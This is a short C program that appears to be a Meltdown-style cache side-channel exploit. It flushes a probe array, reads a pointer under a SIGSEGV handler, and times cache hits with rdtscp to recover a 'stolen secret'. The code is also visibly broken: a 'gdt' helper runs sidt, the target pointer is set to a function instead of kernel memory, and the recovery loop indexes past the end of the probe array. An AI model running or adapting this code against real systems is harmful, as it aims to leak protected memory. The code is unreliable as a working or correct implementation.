#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <setjmp.h>
#include <signal.h>

#define THRESHOLD 130

sigjmp_buf _jmp;

struct gdt_desc {
    unsigned short limit;
    unsigned int base;
} __attribute__((packed)); 

void store_gdt_desc(struct gdt_desc *location) {
    asm volatile ("sidt %0"::"m"(*location):"memory");
}

unsigned long inl_gdt(unsigned long gdt_mem_base) {
    __asm__ __volatile__("sidt %0"
            :"=m"(gdt_mem_base)
            :
            :"memory");
    return gdt_mem_base;
}

void sigsegv_handler() {
    siglongjmp(_jmp, 1);
}

static inline void clflush(volatile void *p) {
    asm volatile("clflush %0" : "+m" (*(volatile char *)p));
}

int probe[256 * 4096];

int main() {
    char * p = inl_gdt;
    signal(SIGSEGV, sigsegv_handler);


    for (int i = 0; i < 256; ++i) {
        clflush(&probe[1024 + i * 4096]);
    }

    if (sigsetjmp(_jmp, 1) == 0) {
        printf("first branch.\n"); 
        int kd = *p; 
        probe[1024 + kd * 4096] += 1;
    } else {
        printf("SIGSEGV\n");
    }
    printf("Program still alive with stolen secret.\n");

    unsigned int jk;
    for (int i = 0; i < 4096; ++i) {
        long long t = __rdtscp(&jk);
        int junk = probe[i * 4096 + 1024];
        long long time_passed = __rdtscp(&jk) - t; 
        if (time_passed < THRESHOLD) {
            printf("Secret is %d\n", i);
            return 0;
        }
    }
} 
